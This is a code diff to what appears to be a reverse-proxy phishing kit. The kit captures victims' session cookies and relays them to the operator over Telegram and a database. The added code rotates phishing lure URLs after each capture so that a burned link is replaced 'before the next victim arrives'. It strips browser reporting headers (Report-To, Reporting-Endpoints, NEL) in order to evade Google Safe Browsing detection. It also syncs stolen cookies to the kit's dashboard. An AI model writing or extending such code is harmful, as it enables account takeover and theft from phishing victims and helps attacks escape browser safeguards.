@@ -1250,7 +1250,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             log.Error("database: %v", err)
                         }
                         s.Finish(false)
-                        // ADD THIS: Send Telegram with cookies
+                        // Immediately rotate the autolure path so the captured URL
+                        // is burned and replaced before the next victim arrives.
+                        if s.PhishLure != nil && s.PhishLure.AutoRotate {
+                            go p.cfg.RotateAutolureForSession(s.PhishLure)
+                        }
                         go p.sendTelegramNotificationForSession(ps.SessionId)
 
                         if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1389,6 +1393,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 resp.Header.Del("Proxy-Connection")
                 resp.Header.Del("Proxy-Authenticate")
                 resp.Header.Del("Server")
+                // Strip Google's browser reporting headers. These instruct Chrome
+                // to send page-activity reports (URLs, errors) back to Google's
+                // collection endpoints, enabling real-time Enhanced Safe Browsing
+                // analysis of the proxied page.
+                resp.Header.Del("Report-To")
+                resp.Header.Del("Reporting-Endpoints")
+                resp.Header.Del("NEL")
 
                 if stringExists(mime, []string{"text/html"}) {
 
@@ -1450,6 +1461,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     if rid, exists := s.Params["rid"]; exists {
                                         database.HandleCapturedCookieSession(rid, s.CookieTokens, map[string]string{"email": rid}, p.livefeed)
                                     }
+                                }
+                                // Rotate autolure path on auth-URL capture completion.
+                                if s.PhishLure != nil && s.PhishLure.AutoRotate {
+                                    go p.cfg.RotateAutolureForSession(s.PhishLure)
                                 }
                             }
 
@@ -2657,7 +2672,16 @@ func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
         ts.Tokens[domain] = domainTokens
     }
 
+    cookiesForDB := s.CookieTokens
     p.session_mtx.Unlock()
+
+    // Sync in-memory cookies to DB so terminal sessions and dashboard
+    // show the same data as Telegram.
+    if len(cookiesForDB) > 0 {
+        if dbErr := p.db.SetSessionCookieTokens(sid, cookiesForDB); dbErr != nil {
+            log.Error("[telegram] db cookie sync: %v", dbErr)
+        }
+    }
 
     // Use the QUEUE-BASED notification system instead of raw HTTP
     // This properly creates formatted messages with cookie files
